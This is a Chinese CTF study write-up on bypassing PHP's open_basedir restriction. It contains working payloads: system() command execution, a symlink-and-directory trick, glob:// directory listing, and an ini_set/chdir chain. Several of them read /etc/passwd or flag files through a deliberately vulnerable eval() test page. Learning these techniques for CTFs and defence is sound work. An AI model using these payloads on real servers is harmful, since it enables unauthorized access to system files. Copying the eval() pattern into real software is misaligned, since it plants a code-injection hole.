# 绕过 open_basedir

**目录**

[TOC]



在ctfshow 72遇到的 open_basedir 所以进行学习

> [https://www.cnblogs.com/hookjoy/p/12846164.html#:~:text=%E5%8F%AA%E6%98%AF%E7%94%A8glob%3A,%E8%83%BD%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E3%80%82](https://www.cnblogs.com/hookjoy/p/12846164.html#:~:text=%E5%8F%AA%E6%98%AF%E7%94%A8glob%3A,%E8%83%BD%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E3%80%82)

上面是师傅的文章

我就跟着复现一下

## 0x01 首先了解什么是 open_basedir

open_basedir是php.ini的设置





<img src="https://i-blog.csdnimg.cn/blog_migrate/5c2ab21f3c721533365a8158d4965aeb.png" alt="" style="max-height:57px; box-sizing:content-box;" />


```cobol
在open_basedir设置路径的话 那么网站访问的时候 无法访问除了设置以外的内容
```

这里还有一个知识点

```cobol
如果我们设置 open_basedir=/var/www/html
 
那我们只能访问
 
/var/www/html/index.php
/var/www/html/images/logo.png
/var/www/html/includes/config.php
 
 
不能访问
 
/var/www/otherfile.php（不在指定目录之下）
/var/www/html2/index.php（不是以指定路径为前缀）
 
 
所以open_basedir并不是以目录名为 规定
 
而是路径
```

我创建了一个test文件夹 存放着 1.php





<img src="https://i-blog.csdnimg.cn/blog_migrate/a8ba14af5559f22f27b7fcbbe3761ba8.png" alt="" style="max-height:297px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/c1d571aa281c59092eb9c9d140f8e6d7.png" alt="" style="max-height:175px; box-sizing:content-box;" />


那我设置open_basedir 指定 test

```cobol
open_basedir =D:\phpstudy_pro\WWW\test
```

那我们看看能不能访问1.php



<img src="https://i-blog.csdnimg.cn/blog_migrate/fad07a1fcf7d209637e632f904e17481.png" alt="" style="max-height:494px; box-sizing:content-box;" />


发现是ok的

那我们去访问一下 www的 flag.php呢



<img src="https://i-blog.csdnimg.cn/blog_migrate/abeb910f2b3b67ac1ed58bbe0b49d5e0.png" alt="" style="max-height:180px; box-sizing:content-box;" />


发现阻止了 并且我们无法访问其他目录 例如sqli-labs



<img src="https://i-blog.csdnimg.cn/blog_migrate/090a7cf245bf3184476b247e52b81856.png" alt="" style="max-height:199px; box-sizing:content-box;" />


## 0x02 通过命令执行绕过

open_basedir对命令执行没有限制

假如没有进行过滤 那我们就可以通过system函数直接执行

我的1.php代码是

```php
<?php
 
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
 
?>
 
```

没有过滤 而且通过post方式

```cobol
c=show_source(__FILE__);system('type D:\phpstudy_pro\WWW\flag.php');
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/56a09732a6e67868ddf5c82a81369427.png" alt="" style="max-height:104px; box-sizing:content-box;" />


成功绕过了 open_basedir

这里是适用于 没有对命令进行过滤

但是一般都难以使用 会被disable_functions 禁用

## 0x03 通过symlink 绕过 （软连接）

```undefined
软连接我们在 ciscn的unzip有见识到
 
就是linux的快捷方式
 
我们可以通过软连接；链接其他文件 然后对其进行访问 
```

这里还需要介绍symlink()函数

```scss
symlink(链接的目标，链接的名称)
```

我们来尝试一下

```php
<?php 
symlink("/root/.presage/","/root/桌面/exp");
?>
```

然后我们执行一下

```cobol
php 2.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e8a4c8de497630fbbb65439e37940e1b.png" alt="" style="max-height:174px; box-sizing:content-box;" />


发现真的生成了一个文件夹exp 并且就是指向了我们需要的目录



<img src="https://i-blog.csdnimg.cn/blog_migrate/87f730c158d22f6283c38d11b488e933.png" alt="" style="max-height:230px; box-sizing:content-box;" />


这里我们开始复现师傅的内容

```perl
mkdir 
创建文件夹
 
 
chdir
切换到某文件夹的工作区间
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/1e111c9c5c6b3979393034c3c5274fc3.png" alt="" style="max-height:127px; box-sizing:content-box;" />


假如我们在/var/www/html/的3.php处

```php
<?php
mkdir("A");
chdir("A");
mkdir("B");
chdir("B");
mkdir("C");
chdir("C");
mkdir("D");
chdir("D");
?>
```

执行



<img src="https://i-blog.csdnimg.cn/blog_migrate/6a20a80e1c476616e33e75becc87d1ab.png" alt="" style="max-height:100px; box-sizing:content-box;" />


发现现在的路径变为了/var/www/html/A/B/C/D/

这个时候 我们已经进入了 D目录

我们需要退回 html界面就通过 ..即可





```scss
<?php
mkdir("A");
chdir("A");
mkdir("B");
chdir("B");
mkdir("C");
chdir("C");
mkdir("D");
chdir("D");
chdir("..");
chdir("..");
chdir("..");
chdir("..");
?>
```

这个时候 就处于 var/www/html目录下

然后我们通过软连接链接 abcd

```perl
<?php
mkdir("A");
chdir("A");
mkdir("B");
chdir("B");
mkdir("C");
chdir("C");
mkdir("D");
chdir("D");
chdir("..");
chdir("..");
chdir("..");
chdir("..");
symlink("A/B/C/D","7abc");
?>
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/ffd1b6a3d781db25dec54ee70b61ead9.png" alt="" style="max-height:166px; box-sizing:content-box;" />




这个时候 我们再建立

```perl
symlink("7abc/../../../../etc/passwd","exp");
```

的链接

但是这个我们是无法建立的 因为不存在这种软连接

但是我们只需要 删除 7abc的软连接 然后创建一个 7abc的文件夹

那么这样 就是

```cobol
目录的7abc/../../../etc/passwd
```

这样就不会访问快捷方式的 而是当前目录的 然后访问exp



<img src="https://i-blog.csdnimg.cn/blog_migrate/2c9dd8002e82b8535cc3349009c0ef89.png" alt="" style="max-height:174px; box-sizing:content-box;" />


发现就是passwd里的内容了



<img src="https://i-blog.csdnimg.cn/blog_migrate/c7946d9485708ddb075331cb085365c6.png" alt="" style="max-height:205px; box-sizing:content-box;" />


这样我们就打破了 open_basedir的限制 访问了其他目录的内容

```perl
<?php
mkdir("A");
chdir("A");
mkdir("B");
chdir("B");
mkdir("C");
chdir("C");
mkdir("D");
chdir("D");
chdir("..");
chdir("..");
chdir("..");
chdir("..");
symlink("A/B/C/D","7abc");
symlink("7abc/../../../../etc/passwd","exp");
unlink("7abc");
mkdir("7abc");
?>
```

这里payload的重点就是

```undefined
我们想要跨越多少层
 
就需要建立多少层的 目录
 
 
然后通过软连接
 
删除 生成文件夹 
 
然后就可以通过当前文件夹 链接到该去的地方
```

## 0x04利用glob://绕过

照常 首先看看什么是 glob://协议

```cobol
glob://协议 就是查找文件路径的模式
 
是从 5.3开始使用的协议
```

利用师傅的 内容进行修改

```php
<?php
$it = new DirectoryIterator("glob:///var/www/html/*.php");
foreach($it as $f) {
    printf("%s: %.1FK\n", $f->getFilename(), $f->getSize()/1024);
%s：字符串
%.1F 一位小数
%K 单位
 
}
?>
```

打印一下 var/www/html的内容



<img src="https://i-blog.csdnimg.cn/blog_migrate/6eee2b3772b76d2342de6335203c82da.png" alt="" style="max-height:119px; box-sizing:content-box;" />


发现生效了

但是如果只是单用 glob://无法绕过的

所以我们需要结合其他函数

#### 方式1——DirectoryIterator+glob://

```php
DirectoryIterator
就是一个接口 用户可以简单轻松的查看目录
```

```php
<?php
$c=$_GET[c];
$a=new DirectoryIterator($c);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

然后我们输入 glob:///* 就可以列出根目录

但是 使用这个方法只能访问根目录和open_basedir受限的目录

所以对于 ctfshow web72 也可以使用这个方法访问根目录

```php
c=?><?php
$a=new DirectoryIterator("glob:///*");
foreach($a as $f){
    echo($f->__toString().'<br>');
}exit();
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e2582af56ee9804cc2f2c9e17111d45f.png" alt="" style="max-height:133px; box-sizing:content-box;" />


得到了flag的地址

回到这里

那我们就应该使用另一个方法

#### 方式2——opendir()+readdir()+glob://

```scss
opendir()打开目录句柄
 
readdir() 读取目录
```

```php
<?php
$a = $_GET['c'];
if ( $b = opendir($a) ) {
    while ( ($file = readdir($b)) !== false ) {
        echo $file."<br>";
    }
    closedir($b);
}
?>
```

这里对于web72也可以使用

```php
c=?><?php if ( $b = opendir("glob:///*") ) {while ( ($file = readdir($b)) !== false ) { echo $file."<br>";}closedir($b);}exit();
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f11729bea239f9294ec3b0f7dd860ed7.png" alt="" style="max-height:438px; box-sizing:content-box;" />


效果和 DirectoryIterator一样

只能根目录和限定目录

## 0x05  通过 ini_set和chdir来绕过

```php
<?php
echo 'open_basedir: '.ini_get('open_basedir').'<br>';
echo 'GET: '.$_GET['c'].'<br>';
eval($_GET['c']);
echo 'open_basedir: '.ini_get('open_basedir');
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/70d71234dbc5161ec169b31cafe7d35d.png" alt="" style="max-height:192px; box-sizing:content-box;" />


通过相对路径

```scss
mkdir('mi1k7ea');chdir('mi1k7ea');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/etc/passwd');
```

首先我们创建一个可以上下跳的目录

```cobol
/var/www/html
 
创建 mi1k7ea 
 
/var/www/html/mi1k7ea
 
切换到当前目录 通过 chdir
 
然后ini_set 设置 open_basedir为 ..
 
那么这个时候 php.ini里的内容就为 ..
那我们进行切换工作目录
 
chdir .. 返回上一个目录 即/var/www/html
 
通过 open_basedir的比对 符合.. 那么就可以访问
 
我们再来一次/var/www
 
/var
 
/
最后到/ 了 但是我们无法通过 / 去访问 因为 / != ..
 
这个时候 我们再来一次 ini_set  设置为 / 
 
这个时候 我们就可以访问 / 下的任何内容了
 
```

```cobol
这里有一个需要注意
 
如果我们的php文件在根目录
 
即/var/www/html/
 
那么就需要创建一个 目录来进行设置
即
 
mkdir("123");chdir("123");ini_set("open_basedir","..");
 
 
 
如果我们不在根目录 
即/var/www/html/test/
 
并且open_basedir为 /var/www/html/
 
那么我们就不需要再创建一个目录来设置
 
直接在test上操作即可
 
即 ini_set("open_basedir","..");chdir("..");
```

到此 差不多就结束了